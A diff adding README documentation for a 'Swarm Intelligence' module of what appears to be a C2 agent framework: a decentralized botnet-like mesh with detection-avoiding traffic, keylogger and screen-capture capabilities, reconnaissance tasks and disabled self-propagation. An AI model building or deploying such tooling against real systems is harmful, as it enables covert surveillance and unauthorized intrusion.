@@ -413,4 +413,126 @@ Or when running the server:
 
 ```bash
 python server_monitor.py --debug
-``` 
+```
+
+## Swarm Intelligence Module
+
+### Overview
+
+The Swarm Intelligence module (`agent_modules/swarm_intelligence.py`) implements a decentralized mesh network of agents capable of collective decision-making without requiring a central command and control server. This creates a resilient, self-organizing network that can continue to operate even if individual nodes or the C2 server are compromised.
+
+⚠️ **WARNING:** This module is provided strictly for academic and research purposes. Deploying this module in a production environment could create an uncontrolled self-organizing network, which may be illegal and dangerous. **Use only in a controlled research environment**.
+
+### Key Features
+
+- **Decentralized Communication**: Agents can communicate directly with each other, forming a mesh network without requiring a central server
+- **Collective Decision Making**: Uses distributed consensus algorithms for group decision-making
+- **Task Distribution**: Intelligent distribution of tasks across the swarm based on capabilities and resources
+- **Resilient Network Structure**: Network continues to function even if individual nodes are disabled
+- **Stealth Operations**: Minimizes network footprint and blends traffic with legitimate services
+
+### Architecture
+
+The Swarm Intelligence module consists of three main components:
+
+1. **SwarmNode**: Main class that manages node identification, communication, and network topology
+2. **ConsensusEngine**: Component responsible for distributed decision-making using voting mechanisms
+3. **TaskDistributor**: Component for distributing and executing tasks across the swarm
+
+#### SwarmNode
+
+The SwarmNode class manages the core functionality:
+
+- Network discovery and connection management
+- Secure communication between nodes
+- Maintenance of the mesh network topology
+- Data synchronization across the swarm
+
+#### ConsensusEngine
+
+The ConsensusEngine implements a Byzantine fault-tolerant consensus mechanism:
+
+- Proposal and voting system for collective decisions
+- Threshold-based consensus determination (typically 66% agreement)
+- Execution of agreed-upon actions
+- Tracking of decision history
+
+#### TaskDistributor
+
+The TaskDistributor enables efficient work distribution:
+
+- Task creation and assignment
+- Intelligent node selection based on capabilities
+- Task execution and result collection
+- Result propagation back to the swarm
+
+### Usage
+
+The Swarm Intelligence module can be initialized as follows:
+
+```python
+from agent_modules.swarm_intelligence import SwarmNode
+
+# Create a swarm node with optional bootstrap nodes
+swarm_node = SwarmNode(
+    listen_port=8443,  # Optional, random if not specified
+    bootstrap_nodes=["192.168.1.100:8443"],  # Optional, initial nodes to connect to
+    discovery_enabled=True,  # Enable automatic discovery of other nodes
+    stealth_mode=True,  # Minimize network footprint
+    agent_context={"capabilities": ["keylogger", "screen_capture"]}  # Share agent capabilities
+)
+
+# Start the node
+swarm_node.start()
+
+# Create a consensus proposal
+consensus_engine = swarm_node.consensus_engine
+proposal_id = consensus_engine.propose_action(
+    action_type="data_collection",
+    action_data={
+        "target_type": "system_info",
+        "priority": "high"
+    }
+)
+
+# Create and distribute a task
+task_distributor = swarm_node.task_distributor
+task_id = task_distributor.create_task(
+    task_type="reconnaissance",
+    task_data={
+        "target_type": "network"
+    }
+)
+
+# Stop the node when done
+swarm_node.stop()
+```
+
+### Security Considerations
+
+Due to the highly distributed nature of this module, several security measures are implemented:
+
+1. **Encrypted Communications**: All inter-node traffic is encrypted
+2. **Node Authentication**: Nodes authenticate each other before exchanging data
+3. **Activity Throttling**: Communication is rate-limited to avoid detection
+4. **Port Selection**: Uses common ports to blend with legitimate traffic
+5. **Limited Propagation**: By default, nodes do not automatically spread to new systems
+
+### Experimental Features
+
+These features are commented out in the code and should remain disabled:
+
+1. **Network Exploration**: Automated discovery of network topology
+2. **Self-Propagation**: Capability to spread to new systems
+3. **Unified Control**: Ability to coordinate all nodes for a single purpose
+
+### Ethical Usage Guidelines
+
+This module must only be used:
+
+1. In isolated research environments
+2. On systems you own or have explicit permission to test
+3. For legitimate security research purposes
+4. To understand and develop defenses against similar technologies
+
+Never deploy this module on production systems or use it for unauthorized access. 
